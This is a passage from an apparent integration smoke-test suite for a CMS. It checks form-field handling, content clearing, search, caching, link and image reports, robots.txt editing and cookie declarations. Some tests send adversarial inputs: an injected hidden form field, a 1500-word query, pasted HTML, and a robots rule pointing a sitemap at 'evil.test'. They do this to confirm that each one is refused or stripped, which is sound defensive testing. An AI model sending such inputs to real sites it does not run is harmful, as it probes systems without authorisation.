        email: 'c@d.gr', about_order: 'no', order_number: 'INJECTED', message: 'hello',
      });
      const injectedJson = await injected.json().catch(() => null);
      if (injectedJson?.data && !('order_number' in injectedJson.data)) {
        ok('a hidden field posted by a non-browser is DROPPED, not stored');
      } else fail('hidden field stored', JSON.stringify(injectedJson?.data)?.slice(0, 160));

      // The branch that WAS taken still requires its field.
      const missing = await submit({ email: 'e@f.gr', about_order: 'yes', message: 'hello' });
      if (missing.status === 422) ok('the branch that WAS taken still requires its field');
      else fail('conditional not enforced', `status=${missing.status}`);

      // The public form page still renders.
      const page = await fetch(`${BASE}/forms/smoke-enquiry`);
      const pageHtml = await page.text();
      if (page.status === 200 && pageHtml.includes('data-show-field="about_order"')) {
        ok('/forms/:type renders the condition onto the wrapper');
      } else fail('form page', `status=${page.status}`);
      if (pageHtml.includes('ab-step-next')) ok('/forms/:type renders step navigation');
      else fail('form steps', 'no next button');

      // Put the definitions back so later assertions see the site they expect.
      await fetch(`${BASE}/api/content-types`, {
        method: 'PUT', headers: h, body: JSON.stringify(adminDefs),
      });
    } else {
      fail('content types with steps', `status=${put.status} ${(await put.text()).slice(0, 200)}`);
    }
  }

  // 8h1q. An EMPTY BODY is a value, not an absence. `validate` treats '' like
  // undefined, so an author who selected the whole article and pressed delete
  // got 200 OK and the old text still stored — nothing failed, nothing logged,
  // and the article came back the next time they opened it.
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const made = await (await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: h,
      body: JSON.stringify({ title: 'Emptiable body', status: 'draft', content: '<p>original text</p>' }),
    })).json().catch(() => null);
    if (made?.data?.slug) {
      await fetch(`${BASE}/api/posts/${made.data.slug}`, {
        method: 'PUT', headers: h, body: JSON.stringify({ content: '' }),
      });
      const after = await (await fetch(`${BASE}/api/posts/${made.data.slug}`, {
        headers: h,
      })).json().catch(() => null);
      if ((after?.data?.content ?? '') === '') ok('a post body can be emptied through the API');
      else fail('empty body ignored', JSON.stringify(after?.data?.content)?.slice(0, 80));

      // ...and an OMITTED field still means "leave it alone".
      await fetch(`${BASE}/api/posts/${made.data.slug}`, {
        method: 'PUT', headers: h, body: JSON.stringify({ content: '<p>back again</p>' }),
      });
      await fetch(`${BASE}/api/posts/${made.data.slug}`, {
        method: 'PUT', headers: h, body: JSON.stringify({ title: 'Renamed only' }),
      });
      const kept = await (await fetch(`${BASE}/api/posts/${made.data.slug}`, { headers: h })).json().catch(() => null);
      if ((kept?.data?.content ?? '').includes('back again')) ok('an omitted field still means leave it alone');
      else fail('omitted field wiped', JSON.stringify(kept?.data?.content)?.slice(0, 80));
    } else {
      fail('empty-body fixture', 'could not create the post');
    }
  }

  // 8h1r. MISSING IMAGES (C-151) — the report reaches /admin/insights and says
  // the true thing when there is nothing to report.
  if (sessionCookie) {
    const page = await (await fetch(`${BASE}/admin/insights`, { headers: { Cookie: sessionCookie } })).text();
    if (page.includes('Missing images')) ok('insights: the missing-images report renders');
    else fail('missing images section', 'not on the page');
    // A published post referencing an /uploads/ file that is not in the library
    // must be listed; a theme asset in public/ must not.
    if (csrfToken) {
      const h = {
        Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,
      };
      const made = await (await fetch(`${BASE}/api/posts`, {
        method: 'POST', headers: h,
        body: JSON.stringify({
          title: 'Missing picture check',
          status: 'published',
          content: '<p><img src="/uploads/zz-not-a-real-file.webp" /></p><p><img src="/images/theme-hero.jpg" /></p>',
        }),
      })).json().catch(() => null);
      if (made?.data?.id) {
        const after = await (await fetch(`${BASE}/admin/insights`, { headers: { Cookie: sessionCookie } })).text();
        if (after.includes('/uploads/zz-not-a-real-file.webp')) ok('insights: a deleted upload is listed');
        else fail('missing image not listed', 'the broken /uploads/ reference is absent');
        if (!after.includes('/images/theme-hero.jpg')) ok('insights: a theme asset is NOT called missing');
        else fail('theme asset reported', 'public/ files are not in the library and are not missing');
      } else {
        fail('missing-image fixture', 'could not create the post');
      }
    }
  }

  // 8h1s. The API renders bodies through the SAME pipeline the SSR pages use.
  // This is the headless install's only view of the CMS, and it used to skip
  // the sanitizer and the lazy hints while promising it did neither.
  if (sessionCookie && csrfToken) {
    const hdr = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const made = await (await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: hdr,
      body: JSON.stringify({
        title: 'Pipeline check',
        status: 'published',
        content: '<h2>How it works</h2><p><img src="/uploads/x1.webp" /></p><p><img src="/uploads/x2.webp" /></p>',
      }),
    })).json().catch(() => null);

    if (made?.data?.slug) {
      const one = await (await fetch(`${BASE}/api/posts/${made.data.slug}`)).json().catch(() => null);
      const body = one?.data?.content_rendered ?? '';
      if (/id="how-it-works"/.test(body)) ok('api single: headings carry anchors');
      else fail('api single anchors', body.slice(0, 120));
      if (/loading="lazy"/.test(body)) ok('api single: later images are lazy');
      else fail('api single lazy', body.slice(0, 200));
      if (!/<script/i.test(body)) ok('api single: no script survives the render');
      else fail('api single sanitize', body.slice(0, 200));

      const list = await (await fetch(`${BASE}/api/posts?limit=50`, { headers: hdr })).json().catch(() => null);
      const row = (list?.data || []).find((p) => p.slug === made.data.slug);
      if (row && /loading="lazy"/.test(row.content_rendered || '')) ok('api list: the SAME pipeline as the single route');
      else fail('api list lazy', 'the list route renders a different body');
      if (row && /id="how-it-works"/.test(row.content_rendered || '')) ok('api list: anchors too');
      else fail('api list anchors', 'no anchors in the list body');
    } else {
      fail('pipeline fixture', 'could not create the post');
    }
  }

  // 8h1u. /api/search honours ?locale=, and only when it is asked to.
  {
    const all = await (await fetch(`${BASE}/api/search?q=the`)).json().catch(() => null);
    const one = await (await fetch(`${BASE}/api/search?q=the&locale=zz`)).json().catch(() => null);
    if (Array.isArray(all?.data)) ok('search: no locale means every language');
    else fail('search locale', 'the unfiltered call broke');
    // `zz` is configured nowhere, so it must come back empty rather than being
    // ignored — an ignored filter is the shape where a bilingual storefront
    // shows the wrong language and nobody can tell the parameter did nothing.
    if (Array.isArray(one?.data) && one.data.length === 0) ok('search: an unused locale returns nothing, not everything');
    else fail('search locale ignored', JSON.stringify(one?.data?.length));
  }

  // 8h1u-S5.1. A huge query is bounded. Thousands of distinct words used to be
  // thousands of ranking passes over every post, from one anonymous GET.
  {
    const words = Array.from({ length: 1500 }, (_, i) => `q${i}x`).join(' ');
    const started = Date.now();
    const res = await fetch(`${BASE}/api/search?q=${encodeURIComponent(words)}`);
    const body = await res.json().catch(() => null);
    const took = Date.now() - started;
    if (res.status === 200 && Array.isArray(body?.data)) ok('search: a 1500-word query answers 200');
    else fail('search huge query', `status=${res.status}`);
    // meta.q echoes what was SEARCHED, and that is clipped to 200 characters —
    // echoing the whole query would hand the payload straight back.
    if (typeof body?.meta?.q === 'string' && body.meta.q.length <= 200) ok('search: ...and echoes only the clipped query');
    else fail('search echo not clipped', `q length ${body?.meta?.q?.length}`);
    if (took < 5000) ok(`search: ...promptly (${took} ms)`);
    else fail('search huge query slow', `${took} ms`);
  }

  // 8h1u-S5.5. PUBLIC CACHE HEADERS on the read API (lib/http-cache.ts).
  //
  // Anonymous: shareable for s-maxage, validated by an ETag. Signed in: never
  // stored anywhere shared. NOTE: until the middleware stops setting the CSRF
  // cookie on cookieless API GETs (step 3, S3.13), a CDN will still refuse to
  // store these — these assertions are about the headers, not a CDN.
  {
    const anonProducts = await fetch(`${BASE}/api/products?limit=2`);
    const cc = anonProducts.headers.get('cache-control') || '';
    const etag = anonProducts.headers.get('etag');
    const vary = anonProducts.headers.get('vary') || '';
    const anonProductsJson = await anonProducts.json().catch(() => null);
    if (/\bpublic\b/.test(cc) && /s-maxage=\d+/.test(cc) && /max-age=0/.test(cc)) {
      ok('cache: anonymous /api/products is shareable (public, s-maxage, max-age=0)');
    } else fail('cache: anonymous products', `Cache-Control=${cc}`);
    if (etag && /^W\//.test(etag)) ok('cache: ...with a weak ETag');
    else fail('cache: products etag', String(etag));
    // Vary may be REPLACED by the middleware's CORS step on allow-listed
    // cross-origin requests; this request carries no Origin, so it must hold.
    if (/cookie/i.test(vary) && /authorization/i.test(vary)) ok('cache: ...varying on Cookie and Authorization');
    else fail('cache: products vary', `Vary=${vary}`);

    const again = await fetch(`${BASE}/api/products?limit=2`, { headers: { 'If-None-Match': etag || '' } });
    const againBody = await again.text();
    if (again.status === 304 && againBody === '') ok('cache: If-None-Match on an unchanged list → bodiless 304');
    else fail('cache: products 304', `status=${again.status} len=${againBody.length}`);

    if (sessionCookie) {
      const staff = await fetch(`${BASE}/api/products?limit=2`, {
        headers: { Cookie: sessionCookie, 'If-None-Match': etag || '*' },
      });
      const staffCc = staff.headers.get('cache-control') || '';
      await staff.arrayBuffer();
      if (staff.status === 200 && staffCc === 'private, no-store' && !staff.headers.get('etag')) {
        ok('cache: a signed-in /api/products is private, no-store — and never a 304 off the public tag');
      } else fail('cache: staff products', `status=${staff.status} Cache-Control=${staffCc}`);
    }

    const firstId = anonProductsJson?.data?.[0]?.id;
    const singles = firstId ? [`/api/products/${firstId}`] : [];
    for (const p of [...singles, '/api/brands', '/api/product-categories', '/api/search?q=the', '/sitemap.xml', '/rss.xml']) {
      const r = await fetch(`${BASE}${p}`);
      const rcc = r.headers.get('cache-control') || '';
      const tag = r.headers.get('etag');
      await r.arrayBuffer();
      if (r.status === 200 && /s-maxage=\d+/.test(rcc) && tag) ok(`cache: anonymous ${p} is shareable with an ETag`);
      else fail(`cache: ${p}`, `status=${r.status} Cache-Control=${rcc} ETag=${tag}`);
    }

    // An error is never given a shared policy.
    const missing = await fetch(`${BASE}/api/products/no-such-product-${Date.now()}`);
    await missing.arrayBuffer();
    if (missing.status === 404 && !/s-maxage/.test(missing.headers.get('cache-control') || '')) {
      ok('cache: a 404 is not made shareable');
    } else fail('cache: 404 cached', `status=${missing.status} cc=${missing.headers.get('cache-control')}`);
  }

  // 8h1v. SEARCH SYNONYMS (C-146): the seam had one consumer.
  //
  // SEARCH_EXPAND was consulted by product search and by nothing else, so a
  // shop's synonyms worked in the catalogue and not in the blog. This asserts
  // BOTH post surfaces — the API and the rendered archive — because their own
  // comments say the two must not answer one query differently.
  if (sessionCookie && csrfToken) {
    const authedJson8 = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const setSyn = (v) => fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authedJson8, body: JSON.stringify({ search_synonyms: v }),
    });

    const mk = await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authedJson8,
      body: JSON.stringify({
        title: 'Choosing a smokemount for every face',
        status: 'published',
        content: '<p>All about smokemounts and how to pick one.</p>',
      }),
    });
    const synSlug = (await mk.json().catch(() => null))?.data?.slug;
    if (!synSlug) {
      fail('synonym fixture', `could not create the post (status ${mk.status})`);
    } else {
      await setSyn('');
      const before = await (await fetch(`${BASE}/api/search?q=smokeframe`)).json().catch(() => null);
      if (!(before?.data || []).some((p) => p.slug === synSlug)) ok('synonyms: the word alone finds nothing');
      else fail('synonym baseline', 'the post matched without a synonym');

      await setSyn('smokeframe, smokemount');
      const after = await (await fetch(`${BASE}/api/search?q=smokeframe`)).json().catch(() => null);
      if ((after?.data || []).some((p) => p.slug === synSlug)) ok('synonyms: /api/search consults the expander');
      else fail('synonym api', JSON.stringify((after?.data || []).map((p) => p.slug)));

      // The rendered archive must agree — it is a separate rankBy call site.
      const archive = await (await fetch(`${BASE}/blog?q=smokeframe`)).text();
      if (archive.includes('smokemount for every face')) ok('synonyms: the rendered archive agrees with the API');
      else {
        const lit = await (await fetch(`${BASE}/blog?q=smokemount`)).text();
        const litRes = await fetch(`${BASE}/blog?q=smokemount`);
        const plain = await (await fetch(`${BASE}/blog`)).text();
        fail('synonym archive',
          `status:${litRes.status} literal:${lit.includes('smokemount for every face')} snippet:${JSON.stringify(lit.slice(0, 160))} `
          + `unfiltered-has-post:${plain.includes('smokemount for every face')} `
          + `unfiltered-cards:${(plain.match(/<article/g) || []).length} `
          + `syn-cards:${(archive.match(/<article/g) || []).length} `
          + `lit-cards:${(lit.match(/<article/g) || []).length}`);
      }

      // A one-way rule must NOT read backwards.
      await setSyn('smokeframe => smokemount');
      const oneWay = await (await fetch(`${BASE}/api/search?q=smokemount`)).json().catch(() => null);
      const backwards = await (await fetch(`${BASE}/api/search?q=smokeframe`)).json().catch(() => null);
      if ((oneWay?.data || []).some((p) => p.slug === synSlug)
        && (backwards?.data || []).some((p) => p.slug === synSlug)) {
        ok('synonyms: a one-way rule still finds the target');
      } else fail('one-way rule', 'the arrow rule did not reach the post');

      // Rubbish must not take search down.
      const bad = await setSyn('<!doctype html><html></html>');
      if (bad.status === 400) ok('synonyms: pasted HTML is refused at the API');
      else fail('synonym html', `status=${bad.status}`);
      const stillWorks = await fetch(`${BASE}/api/search?q=smokemount`);
      if (stillWorks.status === 200) ok('synonyms: search still answers after a refused table');
      else fail('search down', String(stillWorks.status));
      await setSyn('');
    }
  }

  // 8h1w. STAGING (C-89): the three switches that arrive WITH a clone.
  //
  // A staging copy of a live shop starts out indexable, pointed at production's
  // webhooks and reporting into production's analytics, because all three are
  // DATA. This suite runs with STAGING unset, so what it can assert is that the
  // helper every reader now goes through is actually being called by all of
  // them — four of the five used to spell `!!setting` inline, and an override
  // added to the helper alone would have hidden the pages while still
  // submitting the sitemap and the feed.
  {
    const robots = await (await fetch(`${BASE}/robots.txt`)).text();
    const sitemap = await (await fetch(`${BASE}/sitemap.xml`)).text();
    const feed = await (await fetch(`${BASE}/rss.xml`)).text();
    const llms = await fetch(`${BASE}/llms.txt`);
    // Not staging, so all four must be their normal selves — this is the
    // regression guard for the sweep, not for the override.
    if (!/^Disallow: \/$/m.test(robots)) ok('indexing sweep: robots.txt is normal when not staging');
    else fail('robots hidden', robots.slice(0, 120));
    if (/<urlset/.test(sitemap)) ok('indexing sweep: the sitemap still publishes');
    else fail('sitemap empty', sitemap.slice(0, 120));
    if (/<rss|<feed/.test(feed)) ok('indexing sweep: the feed still publishes');
    else fail('feed empty', feed.slice(0, 120));
    if (llms.status === 200) ok('indexing sweep: llms.txt still describes the site');
    else fail('llms hidden', String(llms.status));
  }

  // 8h1u. CLEARING an optional field. An audit found that emptying "Manual
  // order" sent nothing, the update merged, and the old number survived — while
  // the help text promised the opposite. null is the only value that can say
  // "remove this", because 0 is a real position and omission means "leave it".
  if (sessionCookie && csrfToken) {
    const authedJson9 = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const made = await (await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authedJson9,
      body: JSON.stringify({ title: 'Clearable', status: 'draft', menu_order: 7, focus_keyphrase: 'kept' }),
    })).json().catch(() => null);
    const cid = made?.data?.id;
    if (!cid) {
      fail('clearable fixture', 'could not create the post');
    } else {
      const put = (body) => fetch(`${BASE}/api/posts/${cid}`, {
        method: 'PUT', headers: authedJson9, body: JSON.stringify(body),
      }).then((r) => r.json()).catch(() => null);

      const untouched = await put({ title: 'Clearable renamed' });
      if (untouched?.data?.menu_order === 7) ok('clearing: omitting a field LEAVES it, as a merge should');
      else fail('merge lost a field', JSON.stringify(untouched?.data?.menu_order));

      const cleared = await put({ menu_order: null, focus_keyphrase: null });
      if (cleared?.data?.menu_order === undefined) ok('clearing: null REMOVES a manual position');
      else fail('clear menu_order', JSON.stringify(cleared?.data?.menu_order));
      if (cleared?.data?.focus_keyphrase === undefined) ok('clearing: null removes the keyphrase');
      else fail('clear keyphrase', JSON.stringify(cleared?.data?.focus_keyphrase));

      // ...and 0 is still a real position, not a synonym for cleared.
      const zeroed = await put({ menu_order: 0 });
      if (zeroed?.data?.menu_order === 0) ok('clearing: 0 is a position, not an erasure');
      else fail('zero position', JSON.stringify(zeroed?.data?.menu_order));

      // A field NOT on the clearable list must not be removable this way.
      const slugAttempt = await put({ slug: null });
      if (slugAttempt?.data?.slug) ok('clearing: a required field cannot be cleared');
      else fail('slug cleared', JSON.stringify(slugAttempt?.data?.slug));
    }
  }

  // 8h1x. POST ORDERING (C-149): pinned + manual position.
  //
  // The SQL mirror is where this fails silently: json_extract returns NULL for
  // a field absent from a row, so a bare ORDER BY sorts every pre-existing post
  // into the wrong place on the relational driver ONLY. This block runs on all
  // three drivers, which is the only thing that would catch it.
  if (sessionCookie && csrfToken) {
    const authedJson7 = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const mkPost = (body) => fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authedJson7, body: JSON.stringify(body),
    }).then((r) => r.json()).then((j) => j?.data).catch(() => null);

    const newest = await mkPost({ title: 'Order newest', status: 'published' });
    const pinned = await mkPost({ title: 'Order pinned', status: 'published', pinned: true });
    const ordered = await mkPost({ title: 'Order manual', status: 'published', menu_order: 1 });

    if (pinned?.pinned === true) ok('ordering: pinned is stored');
    else fail('pinned not persisted', JSON.stringify(pinned?.pinned));
    if (ordered?.menu_order === 1) ok('ordering: menu_order is stored');
    else fail('menu_order not persisted', JSON.stringify(ordered?.menu_order));

    // A post created with NEITHER must carry neither — absent, not false/0 —
    // or every existing row stops being byte-identical to what it was.
    if (newest && newest.pinned === undefined && newest.menu_order === undefined) {
      ok('ordering: a post with neither field stores neither');
    } else fail('absent fields', JSON.stringify({ p: newest?.pinned, m: newest?.menu_order }));

    const list = await (await fetch(`${BASE}/api/posts?limit=100`)).json().catch(() => null);
    const ids = (list?.data || []).map((p) => p.id);
    const iPin = ids.indexOf(pinned?.id);
    const iOrd = ids.indexOf(ordered?.id);
    const iNew = ids.indexOf(newest?.id);
    if (iPin >= 0 && iPin < iOrd && iPin < iNew) ok('ordering: the pinned post leads the API listing');
    else fail('pin order (api)', `pin=${iPin} manual=${iOrd} newest=${iNew}`);
    if (iOrd >= 0 && iOrd < iNew) ok('ordering: a manual position beats date');
    else fail('manual order (api)', `manual=${iOrd} newest=${iNew}`);

    // ...and the rendered archive agrees with the API. Two surfaces of one site
    // answering one question differently is what the comparator exists to end.
    const archive = await (await fetch(`${BASE}/blog`)).text();
    const pPin = archive.indexOf('Order pinned');
    const pNew = archive.indexOf('Order newest');
    if (pPin >= 0 && pNew >= 0 && pPin < pNew) ok('ordering: the rendered archive agrees with the API');
    else fail('pin order (archive)', `pinned@${pPin} newest@${pNew}`);
  }

  // 8h1y. ALT TEXT (C-62): a writer, a reader, and an audit.
  //
  // The field had one writer nothing called and no reader on the public page,
  // so every row was empty and the column existed only in the schema.
  if (sessionCookie && csrfToken && uploadedImageUrl && uploadedImageId) {
    const authedJson6 = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const ALT = 'A cat on a windowsill';
    const patch = await fetch(`${BASE}/api/media/update`, {
      method: 'PATCH', headers: authedJson6,
      body: JSON.stringify({ ids: [uploadedImageId], patch: { alt_text: ALT } }),
    });
    if (patch.status === 200) ok('alt text: the media record can be described');
    else fail('media update', `status=${patch.status}`);

    // The response is not the database.
    const back = await (await fetch(`${BASE}/api/media/get?limit=200`, { headers: { Cookie: sessionCookie } })).json().catch(() => null);
    const rec = (back?.data || []).find((m) => m.id === uploadedImageId);
    if (rec?.alt_text === ALT) ok('alt text: it is stored, not just echoed');
    else fail('alt persistence', JSON.stringify(rec?.alt_text));

    // Alt is per-file: describing forty pictures with one sentence makes a
    // screen reader read the same wrong caption forty times.
    const bulk = await fetch(`${BASE}/api/media/update`, {
      method: 'PATCH', headers: authedJson6,
      body: JSON.stringify({ ids: [uploadedImageId, 'other-id'], patch: { alt_text: 'x' } }),
    });
    if (bulk.status === 400) ok('alt text: refused on a bulk patch');
    else fail('bulk alt', `expected 400, got ${bulk.status}`);

    const mk = await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authedJson6,
      body: JSON.stringify({
        title: 'Alt smoke', status: 'published',
        content: `<img src="${uploadedImageUrl}">`
          + `<img src="${uploadedImageUrl}" alt="">`
          + `<img src="${uploadedImageUrl}" alt="the author's own words">`,
      }),
    });
    const altSlug = (await mk.json().catch(() => null))?.data?.slug;
    if (!altSlug) {
      fail('alt fixture', `could not create the post (status ${mk.status})`);
    } else {
      const page = await (await fetch(`${BASE}/blog/${altSlug}`)).text();
      const imgs = [...page.matchAll(/<img\b[^>]*\/uploads\/[^>]*>/g)].map((m) => m[0]);
      if (imgs.some((i) => i.includes(`alt="${ALT}"`))) ok('alt text: a missing alt is filled from the library on the page');
      else fail('alt on page', imgs.join(' | ').slice(0, 300));
      // An explicitly empty alt marks a DECORATIVE image. Overwriting it makes a
      // screen reader announce a caption on every spacer.
      if (imgs.some((i) => /alt=""/.test(i))) ok('alt text: an explicitly empty alt survives');
      else fail('decorative alt overwritten', imgs.join(' | ').slice(0, 300));
      if (imgs.some((i) => i.includes("the author's own words") || i.includes('the author&#39;s own words'))) {
        ok("alt text: the author's own alt is never replaced");
      } else fail('author alt lost', imgs.join(' | ').slice(0, 300));

      // ...and the API says the same, because both live shops render it.
      const api = await (await fetch(`${BASE}/api/posts/${altSlug}`)).json().catch(() => null);
      if ((api?.data?.content_rendered || '').includes(`alt="${ALT}"`)) ok('alt text: content_rendered carries it too');
      else fail('alt in api', (api?.data?.content_rendered || '').slice(0, 200));

      // The audit counts what the AUTHOR must fix — the one with no attribute —
      // and never the deliberate empty one.
      const rep = await (await fetch(`${BASE}/admin/insights`, { headers: { Cookie: sessionCookie } })).text();
      if (/image[s]? with no description/.test(rep)) ok('alt text: the audit reports undescribed images');
      else fail('alt audit', 'no alt section in the report');
    }
  }

  // 8h1z. BROKEN LINK CHECKER (C-14) — the INTERNAL half, which is the one that
  // needs no network and no opt-in.
  //
  // The asymmetry: a false positive sends an editor hunting for a link that
  // works, and after two of those the report stops being read — so most of what
  // is asserted here is what must NOT be listed.
  if (sessionCookie && csrfToken) {
    const authedJson5 = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const mk = await fetch(`${BASE}/api/posts`, {
      method: 'POST', headers: authedJson5,
      body: JSON.stringify({
        title: 'Link check smoke',
        status: 'published',
        content: [
          '<a href="/blog/definitely-not-a-real-slug">broken article</a>',
          '<a href="/definitely-not-a-real-page">broken page</a>',
          '<a href="/blog">the archive</a>',
          '<a href="/contact">a built-in route</a>',
          '<a href="/">the home page</a>',
          '<a href="mailto:a@b.test">mail</a>',
          '<a href="#top">an anchor</a>',
          '<a href="https://example.com/whatever">an outbound link</a>',
        ].join(''),
      }),
    });
    const linkSlug = (await mk.json().catch(() => null))?.data?.slug;
    if (!linkSlug) {
      fail('link-check fixture', `could not create the post (status ${mk.status})`);
    } else {
      const rep = await (await fetch(`${BASE}/admin/insights`, { headers: { Cookie: sessionCookie } })).text();

      if (/definitely-not-a-real-slug/.test(rep)) ok('link check: a broken internal article link is reported');
      else fail('link check article', 'the broken /blog/ link is not in the report');
      if (/definitely-not-a-real-page/.test(rep)) ok('link check: a broken internal page link is reported');
      else fail('link check page', 'the broken /<slug> link is not in the report');

      // Everything that WORKS must be absent. Each of these is a distinct way a
      // naive resolver produces a false positive.
      const section = rep.slice(rep.indexOf('Broken links in your content'), rep.indexOf('Dead URLs people are paying'));
      const strays = [
        ['/blog<', 'the archive route'],
        ['/contact<', 'a built-in route'],
        ['mailto:', 'a mail link'],
        ['#top', 'an in-page anchor'],
        ['https://example.com', 'an outbound link in the INTERNAL list'],
      ].filter(([needle]) => section.includes(needle));
      if (strays.length === 0) ok('link check: working, mail, anchor and outbound links are not listed as broken');
      else fail('link check false positives', strays.map((s) => s[1]).join(', '));

      // Outbound checking is off by default and the report says so rather than
      // implying the links were checked and found fine.
      if (/Outbound links are not being checked/.test(rep)) ok('link check: outbound checking is off by default, and says so');
      else fail('link check outbound default', 'the report does not state that outbound links are unchecked');
    }
  }

  // 8h2. ROBOTS.TXT EDITOR (C-3).
  //
  // The asymmetry that shapes these assertions: a custom rule that fails to
  // apply is an inconvenience; a custom rule that outranks the "take this site
  // out of search" switch silently indexes a staging site, and a lost
  // `Disallow: /admin` puts a login form in a search index with nothing logged.
  if (sessionCookie && csrfToken) {
    const authedJson4 = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const setRobots = (patch) => fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authedJson4, body: JSON.stringify(patch),
    });
    const robots = () => fetch(`${BASE}/robots.txt`).then((r) => r.text());

    // Baseline: the managed block with nothing custom.
    await setRobots({ robots_txt: '', discourage_indexing: false });
    const base = await robots();
    if (/^Disallow: \/admin$/m.test(base) && /^Disallow: \/api\/$/m.test(base) && /^Sitemap: https?:\/\/\S+\/sitemap\.xml$/m.test(base)) {
      ok('robots.txt: the managed block is served');
    } else fail('robots managed block', base.slice(0, 200));

    // A custom rule reaches the file...
    await setRobots({ robots_txt: 'Disallow: /search\n\nUser-agent: GPTBot\nDisallow: /' });
    const custom = await robots();
    if (/^Disallow: \/search$/m.test(custom)) ok('robots.txt: a custom rule is served');
    else fail('robots custom rule', custom.slice(0, 300));
    // ...WITHOUT displacing the managed one.
    if (/^Disallow: \/admin$/m.test(custom)) ok('robots.txt: a custom rule cannot remove Disallow: /admin');
    else fail('robots managed lost', custom.slice(0, 300));
    // ...and the operator's own User-agent group is separated by a blank line,
    // or its Disallow silently applies to every crawler on the internet.
    if (/Disallow: \/api\/\nDisallow: \/search/.test(custom)) ok('robots.txt: bare directives JOIN the managed group rather than orphaning');
    else fail('robots orphan rule', custom.slice(0, 300));
    // ...while an operator's own User-agent line opens its OWN group, or its
    // Disallow silently applies to every crawler on the internet.
    if (/Disallow: \/search\n\nUser-agent: GPTBot/.test(custom)) ok('robots.txt: a custom User-agent group is not merged into the managed one');
    else fail('robots group merge', custom.slice(0, 300));

    // The kill switch beats everything, including a custom Allow.
    await setRobots({ robots_txt: 'User-agent: *\nAllow: /\nSitemap: https://evil.test/s.xml', discourage_indexing: true });
    const hidden = await robots();
    if (/^Disallow: \/$/m.test(hidden) && !/Allow:/.test(hidden) && !/evil\.test/.test(hidden)) {
      ok('robots.txt: discourage_indexing overrides every custom rule');
    } else fail('robots kill switch', hidden.slice(0, 300));

    // A body the validator refuses must be REFUSED, not silently stored.
    await setRobots({ discourage_indexing: false });
    const badRes = await setRobots({ robots_txt: '<!doctype html><html><body>404</body></html>' });
    if (badRes.status === 400) ok('robots.txt: pasted HTML is refused at the API');
    else fail('robots html accepted', `status=${badRes.status}`);
    const afterBad = await robots();
    if (!/doctype/i.test(afterBad)) ok('robots.txt: the refused body never reached the file');
    else fail('robots html served', afterBad.slice(0, 200));

    // A decoupled storefront serves robots.txt from ITS origin, so it must be
    // able to read the rules the operator wrote here.
    await setRobots({ robots_txt: 'Disallow: /search' });
    const pub = await (await fetch(`${BASE}/api/settings/get`)).json().catch(() => null);
    if (pub?.data?.robots_txt === 'Disallow: /search') ok('robots.txt: the rules are readable by a headless storefront');
    else fail('robots headless', JSON.stringify(pub?.data?.robots_txt));

    await setRobots({ robots_txt: '' });
  }

  // 8h2a. COOKIE DECLARATION (C-103) + INSIGHTS (C-107).
  //
  // The declaration is a legal document, so the failure that matters is not
  // "the page 404s" but "the page says something false" — a vendor declared
  // that is not configured, or a completeness claim we cannot stand behind.
  if (sessionCookie && csrfToken) {
    const authedJson3 = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const setAnalytics = (patch) => fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: authedJson3, body: JSON.stringify(patch),
    });

    // --- with NOTHING configured -------------------------------------------
    await setAnalytics({ analytics_ga4_id: '', analytics_plausible_id: '', analytics_gtm_id: '' });
    const bare = await fetch(`${BASE}/api/consent/cookies`);
    const bareJson = await bare.json().catch(() => null);
    if (bare.status === 200 && Array.isArray(bareJson?.data?.cookies)) ok('cookie declaration: public GET works with no session');
    else fail('cookie declaration api', `status=${bare.status}`);

    const bareNames = (bareJson?.data?.cookies || []).map((c) => c.name);
    if (bareNames.includes('astrobaas_session') && bareNames.includes('astrobaas_consent')) {
      ok('cookie declaration: this site\'s own cookies are declared');
    } else fail('first-party cookies', bareNames.join(','));
    // A database table and a Prometheus metric both match astrobaas_* and are
    // NOT cookies. Declaring them would be a false statement in a legal document.
    if (!bareNames.some((n) => n === 'astrobaas_doc' || n.startsWith('astrobaas_requests'))) {
      ok('cookie declaration: no rows for things that are not cookies');
    } else fail('non-cookie rows', bareNames.join(','));
    if (bareJson?.data?.incomplete === false) ok('cookie declaration: no caveat when nothing third-party is configured');
    else fail('incompleteness caveat', String(bareJson?.data?.incomplete));

    // --- with a VENDOR configured ------------------------------------------
    await setAnalytics({ analytics_ga4_id: 'G-SMOKE12345' });
    const withGa = await (await fetch(`${BASE}/api/consent/cookies`)).json().catch(() => null);
    const gaNames = (withGa?.data?.cookies || []).map((c) => c.name);
    if (gaNames.includes('_ga')) ok('cookie declaration: a configured vendor brings its cookies');
    else fail('vendor cookies', gaNames.join(','));
    if (withGa?.data?.incomplete === true) ok('cookie declaration: vendor-controlled raises the caveat');
